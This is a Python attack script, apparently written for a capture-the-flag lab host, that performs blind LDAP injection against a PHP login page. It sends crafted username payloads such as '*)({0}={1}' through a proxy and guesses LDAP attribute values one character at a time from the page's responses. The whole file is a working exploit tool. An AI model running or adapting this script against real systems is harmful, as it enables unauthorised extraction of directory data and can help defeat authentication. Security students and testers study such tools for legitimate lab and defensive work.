#!/usr/bin/python
from bs4 import BeautifulSoup
import requests
import time
import sys
import urllib
from itertools import chain
import argparse

url = "http://10.10.10.122/login.php"
startUrl = "http://10.10.10.122/"
proxyValues = {'http': 'http://127.0.0.1:8080'}
SLEEP_VALUE = 3 
lower_letters = range(97,123)
upper_letters = range(65,91)
number_set = range(48,58)

#r= requests.get(url)
#sessionCookie = r.cookies
#print (r.text)
testRange = range(107,109)

#print ("*** Sleeping for %d seconds***" % SLEEPVALUE)
#time.sleep(SLEEPVALUE) #sleep little baby

def findLDAPAttribute(sessionID, lineList, pl,fullRange):
	failedList = []
	foundAttributeDict = {}
	foundAttribute = ''
	foundValue =''
	
	#fullRange = chain(lower_letters)
	headerValues = {'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0', 
		'Accept' :'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Referer': 'http://10.10.10.122/login.php',
		'Connection': 'close'}
	
	#iterate through attributes
	for i in lineList:

		token = ''
		#payload = 'ldapuser)(|(' + i +'=*)'
		#payload = pre + i + post
		giveUp = False;
		fullIteration = 0
		while (giveUp!= True):
			fullIteration=len(token)
			for character in fullRange:
			
				payload = pl.format(i,token+chr(character)+'*')
				#double url encoding is needed 
			
				print ("trying payload %s" % payload)
				payload = urllib.parse.quote_plus(payload) 

				reqdata = {'inputUsername' : payload, 'inputOTP': '123456'}
				with requests.session() as s:
					try:
						s.keep_alive = False
						r = s.post(url,cookies={'PHPSESSID':sessionID}, data=reqdata, headers=headerValues, proxies=proxyValues)
						#non proxy - 
						#r = s.post(url,cookies={'PHPSESSID':sessionID}, data=reqdata, headers=headerValues)
					except Exception as e:
						print(repr(e))
						failedList.append(i)		
					finally:
						s.close()
				#looking for result
				soup = BeautifulSoup(r.text, 'html.parser')
				resultSet = soup.findAll( "div", {"class":"col-sm-10"})
				if len(resultSet[0].text) > 1:
					#if we end up with the failed double url decoding in result, then we need to ignore it 
					if "%" not in resultSet[0].text:
						#"Cannot login" is the indicator for the blind injection
						#add the current character to our token
						token += chr(character)		
						print ("Found a value in attribute %s of value %s" % (i,token))  
						foundAttribute = i
						foundValue = resultSet[0].text
							
				else: 
					print ("no value for %s on length %d with length %d" % (i,len(resultSet[0].text), len(r.text) ))
				time.sleep(SLEEP_VALUE)
			#if the length of the token has not increased, then we're out of options.. 
			if (len(token) == fullIteration):
				giveUp=True #move to the next attribute
			print ("We are at %s" %token) 
		
		if len(token) > 0:
			foundAttributeDict.update({foundAttribute:token})
		print ("All done! values are %s : %s" % (foundAttribute,token))
		finalVal = "Attribute is [" + foundAttribute + "] with value [" + token +"]"
		if len (failedList) > 0: 
			print ("We failed on attributes " + str(failedList))
		
	for keys,value in foundAttributeDict.items():
		print (keys, value)
	return foundAttributeDict
def main():
	
	parser = argparse.ArgumentParser(description='blind ldap injector')
	parser.add_argument('--option', '-o', help = "1-Upper,2-Lower,3-Numbers,4-LowerNumbers,5-all", required=True, choices={1,2,3,4,5}, type=int)
	parser.add_argument('--attribFile', '-f', help = "attribute file", required=True)
	parser.add_argument('--sessionID', '-s', help = "phpsession id", required= True)
	args = parser.parse_args()
	sessionID = args.sessionID
	filename = args.attribFile
	options = args.option
	#filename = sys.argv[1]	
	with open (filename,'r') as f:
		#lineList = f.readlines()
		lineList = [line.rstrip() for line in f]
	#sessionID  = 'e3i2o514r6ltme1cno3skji8s7'
	print ("Starting with SessionID %s Filename %s Option - %d" % (sessionID,filename,options))
	fullRange = ''	
	if options == 1: fullRange = upper_letters
	elif options == 2: fullRange =lower_letters
	elif options==3: fullRange = number_set
	elif options==4: fullRange =chain(lower_letters,number_set)
	elif options==5: fullRange = chain(upper_letters,lower_letters,number_set)

	print (fullRange)	
	 
	#testcase = findLDAPAttribute(sessionID,lineList,'*)(','=ldapuser)')
	#print (testcase)

	#lets look for attributes based on the payload *)
	payload = '*)({0}={1}'
	testcase = findLDAPAttribute(sessionID,lineList,payload,fullRange)
#	print (foundAttributeDict)
	
	payload = 'ldapuser)({0}={1}'
	testcase =findLDAPAttribute(sessionID,lineList,payload,fullRange)
	#this test case works - can get "CANNOT LOGIN" for cn=ldauser*
	#testcase = findLDAPAttribute(sessionID,lineList,'*)(','=ldapuse*')
	#print (testcase)
if __name__ == '__main__':
	sys.exit(main())
	#print ("Message is of length %d and is [%s]" % (len(resultSet[0].text), resultSet[0].text))
	#print (r.text)
